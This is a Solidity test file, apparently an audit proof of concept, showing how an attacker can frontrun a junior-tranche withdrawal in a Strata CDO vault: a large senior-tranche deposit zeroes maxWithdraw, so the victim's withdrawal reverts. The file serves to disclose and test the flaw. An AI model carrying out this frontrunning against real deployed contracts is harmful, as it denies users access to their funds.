// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { CDOTest } from "../../CDO.t.sol";
import { IStrataCDO } from "../../../contracts/tranches/interfaces/IStrataCDO.sol";
import { IUnstakeHandler } from "../../../contracts/tranches/interfaces/cooldown/IUnstakeHandler.sol";
import { ERC4626 } from "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

contract FrontrunJRTWithdrawal is CDOTest {

    function test_FrontrunJRTWithdrawal() public {
        // Setup initial state: Mint and deposit to JRT and SRT
        address victim = address(0x1234);
        address attacker = address(0x5678);
        address initialDepositor = address(0x9999);

        uint256 initialJRTDeposit = 100 ether; // jrtNav ≈ 100 ether
        uint256 initialSRTDeposit = 1000 ether; // srtNav ≈ 1000 ether
        uint256 victimWithdrawalAmount = 40 ether; // Should be valid pre-attack
        uint256 attackDepositAmount = 1000 ether; // Enough to push JRT maxWithdraw to 0

        // Victim deposits to JRT
        vm.startPrank(victim);
        USDe.mint(victim, initialJRTDeposit);
        USDe.approve(address(jrtVault), initialJRTDeposit);
        jrtVault.deposit(initialJRTDeposit, victim);
        vm.stopPrank();

        // Initial depositor to SRT (could be anyone)
        vm.startPrank(initialDepositor);
        USDe.mint(initialDepositor, initialSRTDeposit);
        USDe.approve(address(srtVault), initialSRTDeposit);
        srtVault.deposit(initialSRTDeposit, initialDepositor);
        vm.stopPrank();

        // Verify initial state: JRT maxWithdraw should allow the withdrawal
        uint256 preMaxWithdraw = accounting.maxWithdraw(true); // isJrt=true
        assertGt(preMaxWithdraw, victimWithdrawalAmount, "Initial maxWithdraw too low");

        // Simulate attacker frontrunning with large SRT deposit
        vm.startPrank(attacker);
        USDe.mint(attacker, attackDepositAmount);
        USDe.approve(address(srtVault), attackDepositAmount);
        srtVault.deposit(attackDepositAmount, attacker);
        vm.stopPrank();

        // Now simulate victim's withdrawal attempt (should fail due to updated cap)
        vm.startPrank(victim);
        vm.expectRevert(
            abi.encodeWithSelector(
                ERC4626.ERC4626ExceededMaxWithdraw.selector,
                victim,
                victimWithdrawalAmount,
                0 // Post-attack maxWithdraw should be 0
            )
        );
        jrtVault.withdraw(victimWithdrawalAmount, victim, victim);
        vm.stopPrank();

        // Verify post-attack state
        uint256 postMaxWithdraw = accounting.maxWithdraw(true);
        assertEq(postMaxWithdraw, 0, "Post-attack maxWithdraw not zeroed");
    }
}
